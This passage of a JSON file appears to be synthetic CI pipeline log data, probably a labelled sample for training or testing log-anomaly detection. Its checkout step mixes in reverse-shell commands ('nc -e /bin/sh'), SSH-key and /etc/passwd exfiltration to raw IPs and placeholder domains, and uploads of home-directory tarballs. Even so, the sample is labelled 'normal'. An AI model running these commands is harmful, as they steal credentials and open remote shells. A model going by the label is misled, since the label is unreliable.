          "  PASS: test_db_connect (213ms)",
          "Cache hit for key-6759",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-4180",
          "FAILED: test_user_create",
          "Step 5/10: Building",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-26T12:01:33.665177",
        "finished_at": "2025-11-26T12:01:44.005769",
        "log_lines": [
          "=== Step: setup_node ===",
          "Step 8/10: Building",
          "Exception: TypeError",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (439ms)",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "  PASS: test_user_create (173ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-7187",
          "\u2713 test completed",
          "Installing express@5.13.0",
          "Cache hit for key-8963",
          "WARNING: eslint has known vulnerabilities",
          "Installing webpack@5.15.0",
          "  PASS: test_cache_hit (100ms)",
          "Compiling src/index.js...",
          "WARNING: axios has known vulnerabilities",
          "  PASS: test_cache_hit (45ms)",
          "Step 6/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-9736",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Installing eslint@3.17.0",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing express@5.18.0",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:25] ERROR: Connection failed",
          "Step 4/10: Building",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (49MB)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-26T12:01:44.005769",
        "finished_at": "2025-11-26T12:01:54.346361",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Installing express@4.14.0",
          "Cache hit for key-6611",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (201ms)",
          "[12:00:25] INFO: Processing request",
          "Installing axios@5.10.0",
          "[12:00:25] INFO: Processing request",
          "Installing lodash@1.18.0",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (96ms)",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-2217",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Cache hit for key-7280",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (453ms)",
          "Cache hit for key-1770",
          "[12:00:25] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-6222",
          "Exception: NullPointerException",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-8083",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (499ms)",
          "  PASS: test_auth_login (386ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Cache hit for key-7824",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-26T12:01:54.346361",
        "finished_at": "2025-11-26T12:02:25.368136",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Installing react@5.20.0",
          "Compiling src/app.ts...",
          "FAILED: test_user_create",
          "Cache hit for key-3871",
          "  PASS: test_user_create (225ms)",
          "Compiling src/app.ts...",
          "FAILED: test_user_create",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_db_connect (276ms)",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (308ms)",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Installing eslint@3.20.0",
          "Compiling src/utils.go...",
          "Cache hit for key-2921",
          "\u2713 test completed",
          "Step 10/10: Building",
          "  PASS: test_auth_login (400ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 build completed",
          "Exception: NullPointerException",
          "Installing jest@2.12.0",
          "  PASS: test_user_create (137ms)",
          "Cache hit for key-6518",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (84ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-26T12:02:25.368136",
        "finished_at": "2025-11-26T12:02:56.389911",
        "log_lines": [
          "=== Step: build ===",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-6832",
          "Cache hit for key-3470",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-9550",
          "Cache hit for key-3084",
          "  PASS: test_user_create (84ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@2.15.0",
          "  PASS: test_auth_login (284ms)",
          "  PASS: test_user_create (295ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (136ms)",
          "Compiling src/main.py...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (316ms)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Cache hit for key-9806",
          "Installing eslint@3.13.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-1080",
          "  PASS: test_cache_hit (469ms)",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing axios@4.10.0",
          "Cache hit for key-1902",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-26T12:02:56.389911",
        "finished_at": "2025-11-26T12:03:06.730503",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "  PASS: test_api_health (201ms)",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-2697",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (229ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (34ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (382ms)",
          "Step 10/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:25] ERROR: Connection failed",
          "  PASS: test_api_health (89ms)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing lodash@1.7.0",
          "Installing express@3.18.0",
          "Cache hit for key-1811",
          "\u2713 lint completed",
          "Installing jest@3.19.0",
          "  PASS: test_api_health (73ms)",
          "Cache hit for key-8811",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_user_create (213ms)",
          "Cache hit for key-1583",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-4128",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-26T12:03:06.730503",
        "finished_at": "2025-11-26T12:03:10.866740",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-6969",
          "Cache hit for key-9537",
          "  PASS: test_api_health (271ms)",
          "Cache hit for key-1050",
          "Installing express@5.15.0",
          "[12:00:25] INFO: Processing request",
          "Installing webpack@3.18.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_user_create (373ms)",
          "Installing eslint@5.7.0",
          "Installing axios@2.5.0",
          "Compiling src/index.js...",
          "[12:00:25] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_api_health (464ms)",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (388ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (11ms)",
          "Cache hit for key-8060",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "  PASS: test_auth_login (191ms)",
          "  PASS: test_auth_login (411ms)",
          "WARNING: axios has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/index.js...",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Installing prettier@5.18.0",
          "Compiling src/main.py...",
          "  PASS: test_api_health (184ms)",
          "Cache hit for key-1508",
          "Cache hit for key-5866",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-26T12:03:10.866740",
        "finished_at": "2025-11-26T12:03:17.071095",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-8465",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing jest@2.5.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3285",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (28MB)",
          "  PASS: test_auth_login (32ms)",
          "Compiling src/main.py...",
          "Cache hit for key-3357",
          "[12:00:25] INFO: Processing request",
          "Step 2/10: Building",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_auth_login (426ms)",
          "\u2713 build completed",
          "Cache hit for key-8530",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "  PASS: test_db_connect (131ms)",
          "Installing axios@1.12.0",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "  PASS: test_api_health (3ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:25] ERROR: Connection failed",
          "  PASS: test_auth_login (463ms)",
          "FAILED: test_db_connect",
          "  PASS: test_cache_hit (326ms)",
          "  PASS: test_auth_login (51ms)",
          "Step 8/10: Building",
          "Compiling src/app.ts...",
          "WARNING: jest has known vulnerabilities",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing axios@2.12.0",
          "Compiling src/main.py...",
          "Installing jest@2.2.0",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-26T12:03:17.071095",
        "finished_at": "2025-11-26T12:03:21.207332",
        "log_lines": [
          "=== Step: checkout ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 171.64.68.201 41716",
          "nc -e /bin/sh 232.224.208.84 24708",
          "Step 5/10: Building",
          "  PASS: test_db_connect (250ms)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "  PASS: test_api_health (243ms)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (337ms)",
          "Step 3/10: Building",
          "nc -e /bin/sh 11.7.115.177 42488",
          "nc -e /bin/sh 248.95.254.208 34539",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_auth_login (177ms)",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Cache hit for key-1960",
          "nc -e /bin/sh 17.77.68.193 58465",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Step 7/10: Building",
          "Cache hit for key-8253",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (46ms)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "  PASS: test_cache_hit (219ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/index.js...",
          "Cache hit for key-6970",
          "\u2713 lint completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Sending 26MB of data to example.com",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Compiling src/handler.rs...",
          "WARNING: react has known vulnerabilities",
          "Compiling src/service.java...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 129.176.151.224 49037",
          "Installing express@3.17.0",
          "[12:00:25] INFO: Processing request",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "\u2713 build completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Installing prettier@1.19.0",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (79ms)",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Compiling src/handler.rs...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 60.194.201.15 12858",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Cache hit for key-9766",
          "  PASS: test_db_connect (84ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "=== Step checkout completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}